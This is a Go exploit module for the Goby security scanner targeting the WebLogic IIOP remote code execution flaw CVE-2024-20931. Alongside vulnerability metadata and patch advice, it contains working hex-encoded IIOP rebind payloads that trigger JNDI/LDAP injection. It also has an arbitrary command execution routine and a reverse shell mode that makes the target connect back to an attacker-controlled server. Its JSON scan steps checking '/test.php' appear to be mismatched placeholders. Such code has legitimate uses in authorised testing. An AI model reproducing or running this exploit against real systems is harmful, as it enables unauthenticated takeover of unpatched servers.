package exploits

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/jsonvul/protocols"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Weblogic ForeignOpaqueReference remote code execution vulnerability (CVE-2024-20931)",
    "Description": "<p>WebLogic Server is one of the application server components suitable for both cloud and traditional environments.</p><p>WebLogic has a remote code execution vulnerability that allows an unauthenticated attacker to access and destroy a vulnerable WebLogic Server through the IIOP protocol network. Successful exploitation of the vulnerability can cause WebLogic Server to be taken over by an attacker, resulting in remote code execution.</p>",
    "Product": "Weblogic_interface_7001",
    "Homepage": "https://www.oracle.com/",
    "DisclosureDate": "2024-01-16",
    "Author": "r4v3zn",
    "FofaQuery": "(body=\"Welcome to WebLogic Server\")||(title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "GobyQuery": "(body=\"Welcome to WebLogic Server\")||(title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "Level": "3",
    "Impact": "<p>There is a remote code execution vulnerability in WebLogic, which allows an unauthenticated attacker to access and damage the vulnerable WebLogic Server through the IIOP protocol network. Successful exploitation of the vulnerability can lead to WebLogic Server being taken over by the attacker, resulting in remote code execution.</p>",
    "Recommendation": "<p>1. Currently, the manufacturer has released an upgrade patch. Please pay attention to the official website to download updates in time: <a href=\"https://www.oracle.com/security-alerts/cpujan2024.html\">https://www.oracle.com/security-alerts/cpujan2024.html</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2024-20931"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Weblogic ForeignOpaqueReference 远程代码执行漏洞（CVE-2024-20931）",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server 是其中的一个适用于云环境和传统环境的应用服务器组件。</p><p>WebLogic 存在远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过 IIOP 协议网络访问并破坏易受攻击的 WebLogic Server，成功的漏洞利用可导致 WebLogic Server 被攻击者接管，从而造成远程代码执行。</p>",
            "Recommendation": "<p>1、目前厂商已发布升级补丁，请关注官方网站及时下载更新：<a href=\"https://www.oracle.com/security-alerts/cpujan2024.html\" target=\"_blank\">https://www.oracle.com/security-alerts/cpujan2024.html</a></p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>WebLogic 存在远程代码执行漏洞，该漏洞允许未经身份验证的攻击者通过 IIOP 协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致 WebLogic Server 被攻击者接管，从而造成远程代码执行。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Weblogic ForeignOpaqueReference remote code execution vulnerability (CVE-2024-20931)",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server is one of the application server components suitable for both cloud and traditional environments.</p><p>WebLogic has a remote code execution vulnerability that allows an unauthenticated attacker to access and destroy a vulnerable WebLogic Server through the IIOP protocol network. Successful exploitation of the vulnerability can cause WebLogic Server to be taken over by an attacker, resulting in remote code execution.</p>",
            "Recommendation": "<p>1. Currently, the manufacturer has released an upgrade patch. Please pay attention to the official website to download updates in time: <a href=\"https://www.oracle.com/security-alerts/cpujan2024.html\" target=\"_blank\">https://www.oracle.com/security-alerts/cpujan2024.html</a></p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>There is a remote code execution vulnerability in WebLogic, which allows an unauthenticated attacker to access and damage the vulnerable WebLogic Server through the IIOP protocol network. Successful exploitation of the vulnerability can lead to WebLogic Server being taken over by the attacker, resulting in remote code execution.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-02-21",
    "PocId": "10924"
}`
	getPayloadFlagJMZ5Zj := func(ldapURL, bindName string) []byte {
		bindName = hex.EncodeToString([]byte(bindName))
		bindNameLengthHex := fmt.Sprintf("%x", len(bindName)/2)
		if len(bindName)/2 < 16 {
			bindNameLengthHex = "0" + bindNameLengthHex
		}
		length := make([]byte, 4)
		header := "00000001000000" + bindNameLengthHex + bindName + "0000000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e696e7465726e616c2e466f726569676e4f70617175655265666572656e63653a414246453946443345443735343434463a33443231353237464544353936454631007fffff0a0000003a524d493a6a6176612e7574696c2e486173687461626c653a383635373335363841323131433031313a3133424230463235323134414534423800000000000015010100003f400000000000080000000b00000002000000007fffff0a0000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000001f0000001b6a6176612e6e616d696e672e666163746f72792e696e697469616c00fffffffe00000001000000007fffff0affffffffffffffa000000029000000256f7261636c652e6a6d732e41516a6d73496e697469616c436f6e74657874466163746f7279000000fffffffe00000001000000007fffff0affffffffffffff580000000e0000000a64617461736f757263650000fffffffe00000001000000007fffff0affffffffffffff2c"
		// ldap url length + 4
		binary.BigEndian.PutUint32(length, uint32(len(ldapURL)+4))
		header += hex.EncodeToString(length)
		// ldap url length
		binary.BigEndian.PutUint32(length, uint32(len(ldapURL)))
		header += hex.EncodeToString(length)
		// ldap url
		header += hex.EncodeToString([]byte(ldapURL))
		// ldap url padding
		var ldapURLPadding []byte
		if tmp0len := len(ldapURL) % 4; tmp0len != 0 {
			ldapURLPadding = make([]byte, 4-tmp0len)
		}
		data, _ := hex.DecodeString(header + hex.EncodeToString(ldapURLPadding) + "ffffffff000000000000000000000000")
		return data
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			ldapToken := goutils.RandomHexString(4)
			bindName := goutils.RandomHexString(3)
			ldapURL, _ := godclient.GetGodLDAPCheckURL("U", ldapToken)
			if err := protocols.NewIIOP(u.HostInfo, func(iiop *protocols.IIOP) error {
				if resp, err := iiop.Rebind(getPayloadFlagJMZ5Zj(ldapURL, bindName)); err != nil {
					return errors.New("rebind 失败")
				} else if resp != nil && bytes.Contains(resp, []byte{0x00, 0x00, 0x05, 0x6d, 0x65, 0x74, 0x61, 0x00}) {
					data, _ := hex.DecodeString("47494f5001020001000004b00000000200000000000000014245410000000004000a03060000000000000017466f726569676e4f70617175655265666572656e6365000000000054524d493a7765626c6f6769632e6a6e64692e696e7465726e616c2e466f726569676e4f70617175655265666572656e63653a414246453946443345443735343434463a3344323135323746454435393645463100000000000000001f49444c3a7765626c6f6769632f6a6e64692f696e7465726e616c3a312e300000000000113344323135323746454435393645463100000000000000000000000000000004000000106a6e6469456e7669726f6e6d656e74000000003a524d493a6a6176612e7574696c2e486173687461626c653a383635373335363841323131433031313a313342423046323532313441453442380000000000001249444c3a6a6176612f7574696c3a312e3000000000000004312e30000000001e00000078000000000000003a524d493a6a6176612e7574696c2e486173687461626c653a383635373335363841323131433031313a313342423046323532313441453442380000000000000956616c7565426f78000000000000001d0000001c00000000000000010000000000000001000000000000000000000000000000010000000000000000000000000000000f72656d6f74654a4e44494e616d6500000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000001249444c3a6a6176612f6c616e673a312e3000000000000004312e30000000001e00000048000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000d57537472696e6756616c7565000000000000001b00000000000000010000000000000000000000000000000a7369676e61747572650000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000001249444c3a6a6176612f6c616e673a312e3000000000000004312e30000000001e00000048000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000d57537472696e6756616c7565000000000000001b00000000000000010000000000000000000000000000000a74696d657374616d700000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000001249444c3a6a6176612f6c616e673a312e3000000000000004312e30000000001e00000048000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000d57537472696e6756616c7565000000000000001b0000000000000001000000000000000000000000000000000000000200000033524d493a7765626c6f6769632e6a6e64692e4f70617175655265666572656e63653a3030303030303030303030303030303000000000002a524d493a6a6176612e696f2e53657269616c697a61626c653a30303030303030303030303030303030000000000000000000000000000001000000000000001d0000001c00000000000000010000000000000001000000000000000000000000")
					iiop.Conn.Write(data)
				}
				if _, err := iiop.Lookup(bindName); err != nil {
					return err
				}
				return nil
			}); err != nil && !strings.Contains(err.Error(), `rebind 失败`) {
				return false
			}
			if godclient.PullExists(ldapToken, 5*time.Second) {
				return true
			}
			// 使用已经利用的存根确认漏洞是否修复
			if err := protocols.NewIIOP(u.HostInfo, func(iiop *protocols.IIOP) error {
				cmd := `%%%%%try{var field=java.lang.Class.forName("weblogic.jndi.internal.ForeignOpaqueReference").getDeclaredField("signature_ic");field.getName();}catch(e){e.toString();}`
				if stub, err := iiop.StubData("a61b225af2ba8df4e45e373ae0309b7b"); err != nil {
					return err
				} else if rsp, _ := iiop.Exec(stub, cmd); strings.Contains(rsp, `java.lang.NoSuchFieldException: signature_ic`) {
					return nil
				} else {
					return errors.New("漏洞利用")
				}
			}); err != nil {
				return false
			}
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			var ldapAddr, cmd string
			var waitSessionCh chan string
			if attackType == "cmd" {
				// 执行命令
				ldapAddr = "ldap://" + godclient.GetGodServerHost() + "/A3"
				cmd = goutils.B2S(ss.Params["cmd"])
			} else if attackType == "ldap" {
				// 执行自定义 LDAP
				ldapAddr = goutils.B2S(ss.Params["ldap"])
			} else if attackType == "reverse" {
				waitSessionCh = make(chan string)
				// 构建反弹Shell LDAP
				if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) == 0 {
					expResult.Output = err.Error()
					return expResult
				} else {
					cmd = fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp)
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			if err := protocols.NewIIOP(expResult.HostInfo.HostInfo, func(iiop *protocols.IIOP) error {
				var stub []byte
				if attackType != "ldap" {
					stub, _ = iiop.StubData("a61b225af2ba8df4e45e373ae0309b7b")
				}
				// 存根读取失败或者执行方式非等于cmd
				if stub == nil || len(stub) == 0 {
					bindName := goutils.RandomHexString(3)
					// rebind
					if resp, err := iiop.Rebind(getPayloadFlagJMZ5Zj(ldapAddr, bindName)); err != nil {
						return err
					} else if resp != nil && bytes.Contains(resp, []byte{0x00, 0x00, 0x05, 0x6d, 0x65, 0x74, 0x61, 0x00}) {
						data, _ := hex.DecodeString("47494f5001020001000004b00000000200000000000000014245410000000004000a03060000000000000017466f726569676e4f70617175655265666572656e6365000000000054524d493a7765626c6f6769632e6a6e64692e696e7465726e616c2e466f726569676e4f70617175655265666572656e63653a414246453946443345443735343434463a3344323135323746454435393645463100000000000000001f49444c3a7765626c6f6769632f6a6e64692f696e7465726e616c3a312e300000000000113344323135323746454435393645463100000000000000000000000000000004000000106a6e6469456e7669726f6e6d656e74000000003a524d493a6a6176612e7574696c2e486173687461626c653a383635373335363841323131433031313a313342423046323532313441453442380000000000001249444c3a6a6176612f7574696c3a312e3000000000000004312e30000000001e00000078000000000000003a524d493a6a6176612e7574696c2e486173687461626c653a383635373335363841323131433031313a313342423046323532313441453442380000000000000956616c7565426f78000000000000001d0000001c00000000000000010000000000000001000000000000000000000000000000010000000000000000000000000000000f72656d6f74654a4e44494e616d6500000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000001249444c3a6a6176612f6c616e673a312e3000000000000004312e30000000001e00000048000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000d57537472696e6756616c7565000000000000001b00000000000000010000000000000000000000000000000a7369676e61747572650000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000001249444c3a6a6176612f6c616e673a312e3000000000000004312e30000000001e00000048000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000d57537472696e6756616c7565000000000000001b00000000000000010000000000000000000000000000000a74696d657374616d700000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000001249444c3a6a6176612f6c616e673a312e3000000000000004312e30000000001e00000048000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000000d57537472696e6756616c7565000000000000001b0000000000000001000000000000000000000000000000000000000200000033524d493a7765626c6f6769632e6a6e64692e4f70617175655265666572656e63653a3030303030303030303030303030303000000000002a524d493a6a6176612e696f2e53657269616c697a61626c653a30303030303030303030303030303030000000000000000000000000000001000000000000001d0000001c00000000000000010000000000000001000000000000000000000000")
						iiop.Conn.Write(data)
					}
					// lookup,反弹会占用连接导致超时
					if _, err := iiop.Lookup(bindName); err != nil && ldapAddr != "reverse" {
						return err
					}
				}
				if attackType == "cmd" || attackType == "reverse" {
					if stub == nil || len(stub) == 0 {
						if stubData, err := iiop.StubData("a61b225af2ba8df4e45e373ae0309b7b"); err != nil {
							return err
						} else {
							stub = stubData
						}
					}
					if rsp, err := iiop.Exec(stub, cmd); err != nil {
						return err
					} else if len(rsp) > 0 && attackType == "cmd" {
						expResult.Success = true
						expResult.Output = rsp
						return nil
					} else if len(rsp) > 0 && attackType == "reverse" {
						select {
						case webConsoleID := <-waitSessionCh:
							if u, err := url.Parse(webConsoleID); err == nil {
								expResult.Success = true
								expResult.OutputType = "html"
								sid := strings.Join(u.Query()["id"], "")
								expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
								return nil
							}
						case <-time.After(time.Second * 20):
							return errors.New("反弹失败")
						}
					}
				} else if attackType == "ldap" {
					expResult.Success = true
					expResult.Output = "Check LDAP Address : " + ldapAddr + " ok!"
				}
				return nil
			}); err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			}
			return expResult
		}))
}
